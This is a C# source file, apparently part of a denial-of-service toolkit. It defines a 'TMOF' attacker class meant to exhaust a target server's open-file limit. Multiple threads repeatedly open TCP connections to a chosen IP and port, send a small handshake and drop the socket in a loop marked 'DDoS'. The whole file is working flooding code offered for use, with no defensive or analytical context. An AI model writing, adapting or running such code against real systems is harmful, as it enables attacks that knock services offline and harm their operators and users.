using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;
namespace GAS.Core
{
    /// <summary>
    /// this attack exploits pam opne file limit 
    /// and causes "Too Many Open Files" erro
    /// </summary>
    class rSocket : Socket
    {
        public rSocket(SocketInformation socketinformation)  : base(socketinformation) { }
        public rSocket(AddressFamily adressfamily, SocketType sockettype, ProtocolType protocoltype) : base( adressfamily, sockettype, protocoltype) { }
        public void Dispose(int dispozzz)
        {
            this.Dispose(true);
        }
    }
    class TMOF:IAttacker
    {
        byte[] handshake = new byte[] { 1, 2, 3 };
        IPAddress _ip = IPAddress.Loopback;
        bool init = false;
        private Thread[] WorkingThreads;
        volatile int msockets = int.MaxValue;
        public TMOF(string ip, int port, int threadcount, int max_sockets_on_attacker)
        {
            this.Target = ip;
            this.Port = port;
            this.ThreadCount = threadcount;
            this.msockets = max_sockets_on_attacker;
            WorkingThreads = new Thread[ThreadCount];
        }
        public override void Start()
        {
            if (IsFlooding)
                Stop();
            IsFlooding = true;
            for (int i = 0; i < ThreadCount; i++)
                (WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork))).Start(i);
            init = true;
        }
        private void bw_DoWork(object indexinthreads)
        {
            #region Wait 4 init
            while (!init) Thread.Sleep(100);
            int MY_INDEX_FOR_WORK = (int) indexinthreads;
            #endregion
            #region DDoS
            try
            {
                int csockets = 0;
                while (IsFlooding)
                {
                    while (csockets > msockets)
                        Thread.Sleep(100);
                    try
                    {
                        csockets++;
                        rSocket s = new rSocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        s.NoDelay=  true;
                        s.Connect(Target, Port);
                        s.Shutdown(SocketShutdown.Receive);
                        s.Send(handshake);
                        s.Dispose(0);
                        csockets--;
                    }
                    catch { }
                }
            }
            catch { }
            #endregion
        }
        public override void Stop()
        {
            IsFlooding = false;
        }
    }
}
